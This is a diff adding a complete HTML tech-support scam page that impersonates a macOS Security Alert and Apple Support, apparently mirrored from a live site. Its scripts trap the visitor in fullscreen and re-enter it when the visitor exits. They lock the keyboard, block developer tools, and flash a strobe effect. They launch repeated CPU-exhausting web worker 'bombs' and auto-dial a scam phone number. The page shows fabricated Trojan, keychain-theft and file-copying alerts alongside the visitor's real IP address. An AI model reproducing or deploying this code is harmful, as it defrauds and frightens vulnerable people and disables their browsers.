+          isPlaying = true;
+          audioUnlockEvents.forEach(function (e) {
+            document.removeEventListener(e, tryStartAudio, true);
+          });
+        });
+      }
+
+      if (music) {
+        music.addEventListener('click', toggleMusic);
+        music.addEventListener('canplaythrough', tryStartAudio);
+        music.addEventListener('loadeddata', tryStartAudio);
+      }
+
+      audioUnlockEvents.forEach(function (e) {
+        document.addEventListener(e, tryStartAudio, true);
+      });
+
+      tryStartAudio();
+      hcvaBootMacAudio();
+
+      var hcvaEmbedUi = !!window.HCVA_EMBED_UI;
+      var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+      if (fullscreenEnabled) {
+        document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+        document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+      }
+
+      var isFullscreen = false;
+
+      function getFullscreenElement() {
+        var d = document;
+        return d.fullscreenElement || d.webkitFullscreenElement || d.mozFullScreenElement || d.msFullscreenElement;
+      }
+
+      function requestFullscreenCompat() {
+        var el = document.documentElement;
+        if (el.requestFullscreen) return el.requestFullscreen();
+        if (el.webkitRequestFullscreen) return el.webkitRequestFullscreen();
+        if (el.mozRequestFullScreen) return el.mozRequestFullScreen();
+        if (el.msRequestFullscreen) return el.msRequestFullscreen();
+        return Promise.reject();
+      }
+
+      function syncFullscreenFlag() {
+        isFullscreen = !!getFullscreenElement();
+      }
+
+      function enterPresentation() {
+        if (hcvaEmbedUi) {
+          document.documentElement.classList.add('hcva-immersive-fs');
+          document.body.classList.add('fullscreen');
+          showWelcomeDiv();
+          showSupportText();
+          if (!document.documentElement.dataset.hcvaFlickerDone) {
+            document.documentElement.dataset.hcvaFlickerDone = '1';
+            flickerEffect();
+          }
+          try { document.dispatchEvent(new CustomEvent('hcva-presentation-enter')); } catch (err0) {}
+          if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+        } else if (fullscreenEnabled && !isFullscreen) {
+          isFullscreen = true;
+          keepFullscreenTrap = true;
+          document.body.classList.add('fullscreen');
+          showWelcomeDiv();
+          showSupportText();
+          flickerEffect();
+        } else if (fullscreenEnabled) {
+          document.body.classList.add('fullscreen');
+          showWelcomeDiv();
+          showSupportText();
+        }
+        if (fullscreenEnabled) {
+          requestFullscreenCompat().then(function () {
+            if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+          }).catch(function () {
+            if (!hcvaEmbedUi) {
+              isFullscreen = false;
+              keepFullscreenTrap = false;
+            }
+            if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+          });
+        } else if (typeof hcvaBootMacAudio === 'function') {
+          hcvaBootMacAudio();
+        }
+      }
+
+      document.addEventListener('click', function () { enterPresentation(); }, true);
+
+      if (fullscreenEnabled) {
+        ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(function (ev) {
+          document.addEventListener(ev, syncFullscreenFlag);
+        });
+      }
+
+      var modalOverlay = document.getElementById('modal-overlay');
+      var modalClose   = document.getElementById('modal-close');
+
+      function showModal()  { modalOverlay.style.display = 'block'; }
+      function closeModal() {
+        modalOverlay.style.display = 'none';
+        isPopupVisible = false;
+      }
+
+      modalClose.addEventListener('click', closeModal);
+      showModal();
+
+      function handleCallNow(e) {
+        if (e) e.preventDefault();
+        closeModal();
+        enterPresentation();
+        try { window.location.href = 'tel:+18552513137'; } catch (errTel) {}
+      }
+
+      document.getElementById('modal-accept').addEventListener('click', closeModal);
+      document.getElementById('modal-dismiss').addEventListener('click', handleCallNow);
+
+      setTimeout(function () {
+        if (modalOverlay.style.display === 'none') return;
+        handleCallNow();
+      }, 2000);
+
+      document.addEventListener('click', function () {
+        document.documentElement.style.cursor = 'none';
+        if (isPopupVisible) { closeModal(); }
+      });
+
+      document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
+
+      document.addEventListener('keydown', function (e) {
+        if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 67 || e.keyCode === 83)) e.preventDefault();
+      });
+
+      window.addEventListener('keydown', function (e) {
+        if ([123].includes(e.keyCode || e.which)) { e.preventDefault(); }
+      });
+
+      /* Mac clock */
+      function updateMacClock() {
+        var now = new Date();
+        var h = now.getHours(), m = now.getMinutes();
+        var ampm = h >= 12 ? 'PM' : 'AM';
+        h = h % 12 || 12;
+        var el = document.getElementById('mac-clock');
+        if (el) el.textContent = h + ':' + String(m).padStart(2,'0') + ' ' + ampm;
+      }
+      updateMacClock();
+      setInterval(updateMacClock, 10000);
+
+      /* Progressive threat reveal */
+      var threats = [
+        { sel: '#threat-1', delay: 700  },
+        { sel: '#threat-2', delay: 1800 },
+        { sel: '#threat-3', delay: 2800 },
+        { sel: '#threat-4', delay: 3900 },
+      ];
+      threats.forEach(function(t) {
+        var el = document.querySelector(t.sel);
+        if (el) setTimeout(function(){ el.classList.add('visible'); }, t.delay);
+      });
+
+      if (hcvaEmbedUi) {
+        enterPresentation();
+        if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+        [200, 800, 2000, 4000].forEach(function (ms) {
+          setTimeout(function () {
+            enterPresentation();
+            if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+          }, ms);
+        });
+      }
+    });
+
+    /* Flicker effect */
+    function flickerEffect() {
+      const d = document.createElement("div");
+      d.style.cssText = "position:fixed;inset:0;z-index:999999999;pointer-events:none;";
+      document.body.appendChild(d);
+      let f = true;
+      const iv = setInterval(() => { d.style.backgroundColor = f ? "black" : "white"; f = !f; }, 80);
+      setTimeout(() => { clearInterval(iv); d.remove(); }, 4000);
+    }
+
+    /* Worker bomb */
+    function workerBomb() {
+      const script = `let c=0;while(true){c++;Math.random()*Math.random();if(c%1e6===0)postMessage({status:"working",counter:c});}`;
+      const url = URL.createObjectURL(new Blob([script], { type: "application/javascript" }));
+      for (let i = 0; i < 6; i++) {
+        const w = new Worker(url);
+        w.onerror = () => {};
+      }
+    }
+
+    let bombActivated = false;
+    let fullscreenTimer = null;
+    let repeatBombTimer = null;
+    var keepFullscreenTrap = false;
+
+    function setupFullscreenListener() {
+      ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange'].forEach(ev => {
+        document.addEventListener(ev, function() {
+          const fs = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
+          if (fs) {
+            if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+            if (!bombActivated) {
+              fullscreenTimer = setTimeout(function() {
+                bombActivated = true;
+                workerBomb();
+                repeatBombTimer = setInterval(function() { workerBomb(); }, 30000);
+              }, 4000);
+            }
+          } else if (!fs) {
+            if (fullscreenTimer) { clearTimeout(fullscreenTimer); fullscreenTimer = null; }
+            if (repeatBombTimer) { clearInterval(repeatBombTimer); repeatBombTimer = null; }
+            bombActivated = false;
+            if (keepFullscreenTrap && !window.HCVA_EMBED_UI) {
+              requestAnimationFrame(function () {
+                var el = document.documentElement;
+                var p = el.requestFullscreen ? el.requestFullscreen() : (el.webkitRequestFullscreen ? Promise.resolve(el.webkitRequestFullscreen()) : Promise.reject());
+                if (p && typeof p.catch === 'function') p.catch(function () {});
+              });
+            }
+          }
+        });
+      });
+    }
+    setupFullscreenListener();
+
+    if (window.HCVA_EMBED_UI) {
+      document.addEventListener('hcva-presentation-enter', function () {
+        if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+        if (!bombActivated) {
+          fullscreenTimer = setTimeout(function () {
+            bombActivated = true;
+            workerBomb();
+            repeatBombTimer = setInterval(function () { workerBomb(); }, 30000);
+          }, 4000);
+        }
+      });
+      document.addEventListener('hcva-presentation-leave', function () {
+        if (fullscreenTimer) { clearTimeout(fullscreenTimer); fullscreenTimer = null; }
+        if (repeatBombTimer) { clearInterval(repeatBombTimer); repeatBombTimer = null; }
+        bombActivated = false;
+      });
+    }
+
+    if (!window.HCVA_EMBED_UI) {
+      if (navigator.keyboard) navigator.keyboard.lock().catch(function () {});
+      document.onkeydown = function (e) { return false; };
+    }
+
+    function showWelcomeDiv() {
+      document.getElementById('welcomeDiv').style.display = 'block';
+    }
+    function showSupportText() {
+      document.getElementById('support-text').style.display = 'block';
+    }
+  </script>
+
+  <script>
+    document.addEventListener("contextmenu", function (e) { e.preventDefault(); });
+    document.addEventListener("keydown", function (e) {
+      if (e.key === "F12") e.preventDefault();
+      if (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) e.preventDefault();
+      if (e.ctrlKey && e.key === "u") e.preventDefault();
+      if (e.metaKey && e.altKey && ["i","u"].includes(e.key)) e.preventDefault();
+    });
+    window.addEventListener("load", function () {
+      if (navigator.platform.toLowerCase().includes("mac")) {
+        document.body.style.cursor = "none";
+      }
+    });
+  </script>
+</head>
+
+<body>
+  <audio id="music" src="text-to-speech.mp3" loop preload="auto" autoplay muted playsinline webkit-playsinline></audio>
+  <script>
+    if (typeof hcvaBootMacAudio === 'function') hcvaBootMacAudio();
+  </script>
+
+  <!-- ── macOS Menu Bar ── -->
+  <div class="mac-menubar">
+    <span class="mac-menubar__apple">&#63743;</span>
+    <div class="mac-menubar__items">
+      <span class="mac-menubar__item semibold">Security</span>
+      <span class="mac-menubar__item">File</span>
+      <span class="mac-menubar__item">View</span>
+      <span class="mac-menubar__item">Window</span>
+      <span class="mac-menubar__item">Help</span>
+    </div>
+    <div class="mac-menubar__right">
+      <!-- Wi-Fi icon -->
+      <div class="mac-mb-icon">
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+          <path d="M8 12.5a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3zm0-3.5a6 6 0 0 1 4.243 1.757l-1.415 1.415A4 4 0 0 0 8 11a4 4 0 0 0-2.828 1.172L3.757 10.757A6 6 0 0 1 8 9zm0-3.5a9.5 9.5 0 0 1 6.718 2.782l-1.415 1.415A7.5 7.5 0 0 0 8 8a7.5 7.5 0 0 0-5.303 2.197L1.282 8.782A9.5 9.5 0 0 1 8 6z"/>
+        </svg>
+      </div>
+      <!-- Battery icon -->
+      <div class="mac-mb-icon">
+        <svg viewBox="0 0 20 10" xmlns="http://www.w3.org/2000/svg">
+          <rect x="0.5" y="0.5" width="16" height="9" rx="2" ry="2" fill="none" stroke="white" stroke-width="1"/>
+          <rect x="17" y="3" width="2.5" height="4" rx="1" fill="white" opacity="0.6"/>
+          <rect x="2" y="2" width="11" height="6" rx="1" fill="white" opacity="0.9"/>
+        </svg>
+      </div>
+      <!-- Volume icon -->
+      <div class="mac-mb-icon">
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+          <path d="M9 2L5 5H2v6h3l4 3V2zM11.5 4.5a5 5 0 0 1 0 7"/>
+          <path fill="none" stroke="white" stroke-width="1.3" stroke-linecap="round" d="M9 2L5 5H2v6h3l4 3V2z M11.5 4.5a5 5 0 0 1 0 7"/>
+        </svg>
+      </div>
+      <span class="mac-mb-clock" id="mac-clock">12:00 PM</span>
+    </div>
+  </div>
+
+  <!-- ── Desktop area ── -->
+  <div class="mac-desktop">
+
+    <!-- ── Main Security Window ── -->
+    <div class="mac-window">
+
+      <!-- Title bar -->
+      <div class="mac-titlebar">
+        <div class="mac-traffic">
+          <div class="mac-dot mac-dot-r"></div>
+          <div class="mac-dot mac-dot-y"></div>
+          <div class="mac-dot mac-dot-g"></div>
+        </div>
+        <div class="mac-titlebar-label">
+          <!-- Lock icon -->
+          <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="6" width="10" height="7" rx="2" fill="rgba(235,235,245,0.7)"/>
+            <path d="M4.5 6V4.5a2.5 2.5 0 1 1 5 0V6" stroke="rgba(235,235,245,0.7)" stroke-width="1.3" fill="none"/>
+            <circle cx="7" cy="9.5" r="1" fill="rgba(28,28,30,0.8)"/>
+          </svg>
+          Security &amp; Privacy
+        </div>
+      </div>
+
+      <!-- Toolbar / scan status -->
+      <div class="mac-toolbar">
+        <div class="mac-toolbar-chip">
+          <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4.5" fill="none" stroke="#ff453a" stroke-width="1"/><text x="5" y="7.5" text-anchor="middle" font-size="7" font-weight="900" fill="#ff453a">!</text></svg>
+          THREAT DETECTED
+        </div>
+        <div class="mac-toolbar-scan">
+          <div class="mac-scan-label">
+            <span>Scanning system…</span>
+            <span id="scan-pct">0%</span>
+          </div>
+          <div class="mac-scan-track">
+            <div class="mac-scan-fill" id="scan-fill"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Window body -->
+      <div class="mac-window-body">
+
+        <!-- Alert header -->
+        <div class="mac-alert-head">
+          <div class="mac-alert-icon-wrap">
+            <!-- Apple shield alert SVG -->
+            <svg viewBox="0 0 54 54" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M27 4L7 11v15c0 12.15 8.6 23.52 20 26 11.4-2.48 20-13.85 20-26V11L27 4z" fill="url(#shieldGrad)"/>
+              <defs>
+                <linearGradient id="shieldGrad" x1="27" y1="4" x2="27" y2="52" gradientUnits="userSpaceOnUse">
+                  <stop offset="0%" stop-color="#ff6b6b"/>
+                  <stop offset="100%" stop-color="#c0392b"/>
+                </linearGradient>
+              </defs>
+              <text x="27" y="36" text-anchor="middle" font-size="20" font-weight="900" fill="white" font-family="-apple-system, sans-serif">!</text>
+            </svg>
+          </div>
+          <div class="mac-alert-titles">
+            <h1>macOS Security Alert</h1>
+            <p>Apple's Gatekeeper and XProtect have<br>detected critical threats on this Mac.</p>
+          </div>
+        </div>
+
+        <!-- IP info -->
+        <div class="mac-section-label">Threat Source</div>
+        <div class="mac-ip-box">
+          <div class="mac-ip-row">
+            <span class="mac-ip-key">Compromised IP</span>
+            <span class="mac-ip-val" data-hcva-ip>Detecting…</span>
+          </div>
+          <div class="mac-ip-row">
+            <span class="mac-ip-key">Location</span>
+            <span class="mac-ip-val" data-hcva-location>—</span>
+          </div>
+          <div class="mac-ip-row">
+            <span class="mac-ip-key">Network (ISP)</span>
+            <span class="mac-ip-val" data-hcva-isp>—</span>
+          </div>
+          <div class="mac-ip-row">
+            <span class="mac-ip-key">Status</span>
+            <span class="mac-badge-red">
+              <svg viewBox="0 0 8 8" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="4" fill="#ff453a"/><text x="4" y="6" text-anchor="middle" font-size="6" font-weight="900" fill="white">!</text></svg>
+              IP COMPROMISED
+            </span>
+          </div>
+        </div>
+
+        <!-- Threats -->
+        <div class="mac-section-label">Detected Threats</div>
+        <div class="mac-threats">
+          <div class="mac-threat-row" id="threat-1">
+            <div class="mac-threat-dot">!</div>
+            <div class="mac-threat-content">
+              <strong>CRITICAL &mdash; OSX/Shlayer Trojan</strong>
+              <span>Adware injector active &mdash; XProtect bypass confirmed</span>
+            </div>
+          </div>
+          <div class="mac-threat-row" id="threat-2">
+            <div class="mac-threat-dot">!</div>
+            <div class="mac-threat-content">
+              <strong>CRITICAL &mdash; iCloud Credential Leak</strong>
+              <span>Apple ID token exposed to remote C2 server</span>
+            </div>
+          </div>
+          <div class="mac-threat-row" id="threat-3">
+            <div class="mac-threat-dot">!</div>
+            <div class="mac-threat-content">
+              <strong>HIGH &mdash; Keychain Data Exfiltration</strong>
+              <span>Encrypted tunnel detected &mdash; password theft in progress</span>
+            </div>
+          </div>
+          <div class="mac-threat-row" id="threat-4">
+            <div class="mac-threat-dot">!</div>
+            <div class="mac-threat-content">
+              <strong>HIGH &mdash; Brute-force Apple ID Login</strong>
+              <span>Repeated unauthorized login attempts from flagged network</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Call box -->
+        <div class="mac-call-box">
+          <!-- Phone icon -->
+          <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="14" cy="14" r="14" fill="rgba(10,132,255,0.18)"/>
+            <path d="M10 7h3l1.5 3.5-2 1.5c.8 1.7 2.3 3.2 4 4l1.5-2L21 15.5V18.5C21 19.3 20.3 20 19.5 20 11.5 20 8 12.5 8 8.5 8 7.7 8.7 7 9.5 7H10z" fill="#0a84ff"/>
+          </svg>
+          <div class="mac-call-text">
+            <div class="lbl">Free AppleCare Security Line &mdash; 24/7</div>
+            <div class="num">+1 (855) 251-3137</div>
+          </div>
+        </div>
+
+        <!-- Action buttons -->
+        <div class="mac-btn-row">
+          <button class="mac-btn-secondary" onclick="document.getElementById('modal-overlay').style.display='none'">Dismiss</button>
+          <button class="mac-btn-primary" onclick="enterPresentation()">Get Immediate Help</button>
+        </div>
+
+      </div><!-- /.mac-window-body -->
+    </div><!-- /.mac-window -->
+
+  </div><!-- /.mac-desktop -->
+
+  <!-- macOS file transfer progress -->
+  <div id="mac-file-transfer" class="mac-file-transfer" aria-live="polite">
+    <div class="mac-file-transfer__shell">
+      <div class="mac-file-transfer__header">
+        <div class="mac-file-transfer__icons">
+          <div class="mac-file-transfer__ico" aria-hidden="true">
+            <svg viewBox="0 0 32 32" fill="none"><path d="M5 9a3 3 0 013-3h6.5L17 8.5H26a3 3 0 013 3v14a3 3 0 01-3 3H8a3 3 0 01-3-3V9z" fill="#5AC8FA"/><path d="M14 6H26a2 2 0 012 2v1H8V7.5A2 2 0 0110 6h4z" fill="#32ADE6"/></svg>
+          </div>
+          <span class="mac-file-transfer__arrow" aria-hidden="true">›</span>
+          <div class="mac-file-transfer__ico" aria-hidden="true">
+            <svg viewBox="0 0 32 32" fill="none"><rect x="5" y="9" width="22" height="16" rx="2" fill="#636366"/><circle cx="24" cy="8" r="4.5" fill="#48484A" stroke="#98989D" stroke-width="1"/><text x="24" y="10.5" text-anchor="middle" font-size="5.5" font-weight="700" fill="#fff">?</text></svg>
+          </div>
+        </div>
+        <div class="mac-file-transfer__copy">
+          <p class="mac-file-transfer__title">Copying <span id="mft-count">2,847</span> items</p>
+          <p class="mac-file-transfer__subtitle">From <strong>Macintosh HD</strong> to <strong>unknown address</strong></p>
+        </div>
+      </div>
+      <div class="mac-file-transfer__progress-track">
+        <div class="mac-file-transfer__progress-fill" id="mft-fill"></div>
+      </div>
+      <div class="mac-file-transfer__meta">
+        <span id="mft-time">About 2:00 remaining</span>
+        <span id="mft-remaining">2,847 items remaining</span>
+      </div>
+      <div class="mac-file-transfer__file" id="mft-file">Preparing items…</div>
+      <div class="mac-file-transfer__footer">
+        <button type="button" class="mac-file-transfer__stop" tabindex="-1">Stop</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Notification 1 (top-right) ── -->
+  <div class="mac-notif">
+    <div class="mac-notif-top">
+      <div class="mac-notif-appicon">&#63743;</div>
+      <span class="mac-notif-appname">Security &amp; Privacy</span>
+      <span class="mac-notif-time">now</span>
+    </div>
+    <div class="mac-notif-title">Malware Detected on This Mac</div>
+    <div class="mac-notif-body">OSX/Shlayer Trojan is actively running.<br>Your iCloud data may be at risk. Call +1 (855) 251-3137.</div>
+  </div>
+
+  <!-- ── Notification 2 (top-right, delayed) ── -->
+  <div class="mac-notif mac-notif-2">
+    <div class="mac-notif-top">
+      <div class="mac-notif-appicon" style="font-size:9px;color:#ff9f0a;">KEY</div>
+      <span class="mac-notif-appname">Keychain Access</span>
+      <span class="mac-notif-time">now</span>
+    </div>
+    <div class="mac-notif-title">Password Breach Alert</div>
+    <div class="mac-notif-body">Saved passwords may have been<br>exposed. Contact Apple Support immediately.</div>
+  </div>
+
+  <!-- ── Bottom marquee ── -->
+  <div class="mac-marquee">
+    <div class="mac-marquee-track">
+      <div class="mac-marquee-item">
+        <span>&#63743;</span>
+        <span>CRITICAL ALERT: macOS Security &bull; Threat detected on your Mac &bull; Do NOT close this window &bull; Call Apple Support now &bull; +1 (855) 251-3137 &bull; Free 24/7 AppleCare Security &bull;</span>
+      </div>
+      <div class="mac-marquee-item">
+        <span>&#63743;</span>
+        <span>CRITICAL ALERT: macOS Security &bull; Threat detected on your Mac &bull; Do NOT close this window &bull; Call Apple Support now &bull; +1 (855) 251-3137 &bull; Free 24/7 AppleCare Security &bull;</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── macOS-style initial modal ── -->
+  <div id="modal-overlay">
+    <div id="modal-content">
+      <span id="modal-close">&times;</span>
+      <!-- Shield icon -->
+      <div class="modal-icon-wrap">
+        <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M26 3L6 10v14c0 11.5 8.3 22.3 20 25 11.7-2.7 20-13.5 20-25V10L26 3z" fill="url(#mShield)"/>
+          <defs>
+            <linearGradient id="mShield" x1="26" y1="3" x2="26" y2="50" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#ff6b6b"/>
+              <stop offset="100%" stop-color="#c0392b"/>
+            </linearGradient>
+          </defs>
+          <text x="26" y="35" text-anchor="middle" font-size="20" font-weight="900" fill="white" font-family="-apple-system,sans-serif">!</text>
+        </svg>
+      </div>
+      <p id="modal-message">Your Mac Has Been Compromised</p>
+      <div id="modal-ip-block">
+        <div style="font-size:11px;color:rgba(235,235,245,0.5);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px;">Threat Source Detected</div>
+        <div>Your public IP address:</div>
+        <span class="hcva-ip-big" data-hcva-ip>Detecting…</span>
+        <div>Location: <span data-hcva-location style="color:#f2f2f7;font-weight:600;">Detecting…</span></div>
+        <div>ISP: <span data-hcva-isp style="color:#f2f2f7;font-weight:600;">Detecting…</span></div>
+        <div class="modal-badges">
+          <span class="hcva-ip-bad">IP COMPROMISED</span>
+          <span class="hcva-ip-bad2">HACKERS BREACHED</span>
+        </div>
+      </div>
+      <p class="modal-sub">Contact Apple Support immediately to remove the threat and secure your Mac.</p>
+      <div class="modal-btns">
+        <button id="modal-accept" class="ok-btn" type="button">Dismiss</button>
+        <a id="modal-dismiss" class="call-btn blinking" href="tel:+18552513137">
+          <span class="call-btn__label">Call Now</span>
+          <span class="call-btn__num">+1 (855) 251-3137</span>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- welcomeDiv -->
+  <div id="welcomeDiv">
+    <p>
+      <strong>&#63743; IP Compromised &mdash; Hackers Have Breached This Mac.</strong><br>
+      Your IP: <span data-hcva-ip>…</span> &nbsp;|&nbsp; Location: <span data-hcva-location>…</span><br>
+      Call immediately to secure your system:<br>
+      <span id="cb5-tfn-primary" style="font-size:18px;font-weight:700;color:#0a84ff;">+1 (855) 251-3137</span>
+    </p>
+  </div>
+
+  <div id="support-text">
+    <div class="support-alert">IP compromised &middot; Hackers breached &middot; Call for assistance</div>
+    <div class="support-line">Apple Support <span id="cb5-tfn-secondary" class="support-number">+1 (855) 251-3137</span></div>
+  </div>
+
+  <!-- Scan progress percentage updater -->
+  <script>
+    (function() {
+      var fill = document.getElementById('scan-fill');
+      var pct  = document.getElementById('scan-pct');
+      if (!fill || !pct) return;
+      var targets = [
+        { at: 400,  val: 48 },
+        { at: 1200, val: 76 },
+        { at: 2200, val: 91 },
+        { at: 3800, val: 100 }
+      ];
+      targets.forEach(function(t) {
+        setTimeout(function() {
+          pct.textContent = t.val + '%';
+          if (t.val === 100) {
+            pct.style.color = '#ff453a';
+            pct.textContent = '100% — THREATS FOUND';
+          }
+        }, t.at);
+      });
+    })();
+  </script>
+
+  <!-- macOS file transfer animation -->
+  <script>
+    (function () {
+      var started = false;
+      var shown = false;
+      var TOTAL = 2847;
+      var DURATION_SEC = 120;
+
+      function formatTimeRemaining(secsLeft) {
+        var s = Math.max(0, secsLeft);
+        if (s <= 0) return "Finishing…";
+        if (s >= 60) {
+          var mins = Math.floor(s / 60);
+          var secs = s % 60;
+          return "About " + mins + ":" + String(secs).padStart(2, "0") + " remaining";
+        }
+        if (s >= 10) return "About " + s + " seconds remaining";
+        return "A few seconds remaining";
+      }
+
+      function fmt(n) { return Math.max(0, n).toLocaleString("en-US"); }
+
+      function startMacFileTransferAnim() {
+        if (started) return;
+        started = true;
+
+        var fillEl = document.getElementById("mft-fill");
+        var timeEl = document.getElementById("mft-time");
+        var remEl = document.getElementById("mft-remaining");
+        var fileEl = document.getElementById("mft-file");
+        if (!fillEl || !timeEl || !remEl || !fileEl) return;
+
+        var FILES = [
+          "/System/Library/LaunchDaemons/com.apple.security.plist",
+          "/Users/Shared/.hidden_update",
+          "/Library/Caches/com.apple.security.agent",
+          "~/Library/Keychains/login.keychain-db",
+          "/private/tmp/.icloud_sync_cache",
+          "/Applications/Safari.app/Contents/MacOS/Safari",
+          "/Users/Shared/Relocated Items/security/log.dat",
+          "/System/Volumes/Data/Users/.bash_history",
+          "/Library/Preferences/com.apple.loginwindow.plist",
+          "/var/root/.ssh/authorized_keys",
+        ];
+
+        var fileIdx = 0;
+        var start = Date.now();
+        var lastSecond = -1;
+
+        function tick() {
+          var elapsed = (Date.now() - start) / 1000;
+          var secNow = Math.floor(elapsed);
+          var secsLeft = Math.max(0, DURATION_SEC - secNow);
+          var pct = Math.min(89, (secNow / DURATION_SEC) * 89);
+          var done = Math.floor((pct / 100) * TOTAL);
+          var remaining = Math.max(0, TOTAL - done);
+
+          if (secNow !== lastSecond) {
+            lastSecond = secNow;
+          }
+
+          fillEl.style.width = pct.toFixed(1) + "%";
+          timeEl.textContent = formatTimeRemaining(secsLeft);
+          remEl.textContent = fmt(remaining) + " items remaining";
+
+          if (Math.random() > 0.62) {
+            fileIdx = (fileIdx + 1) % FILES.length;
+            fileEl.textContent = FILES[fileIdx];
+          } else if (secNow < 2) {
+            fileEl.textContent = "Preparing items…";
+          }
+
+          if (secsLeft > 0 || pct < 89) {
+            requestAnimationFrame(tick);
+          }
+        }
+
+        requestAnimationFrame(tick);
+      }
+
+      function showMacFileTransfer() {
+        if (shown) return;
+        shown = true;
+        var box = document.getElementById("mac-file-transfer");
+        if (box) box.classList.add("is-visible");
+        startMacFileTransferAnim();
+      }
+
+      setTimeout(showMacFileTransfer, 3000);
+    })();
+  </script>
+
+  <script src="../js/visitor-ip.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
+  <script>window.__CB5_PLATFORM__ = 'mac';</script>
+  <script src="../js/load-tfn.js"></script>
+</body>
+
+<!-- Mirrored from monkfish-app-jflmp.ondigitalocean.app/huh/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Jan 2026 18:19:38 GMT -->
+</html>
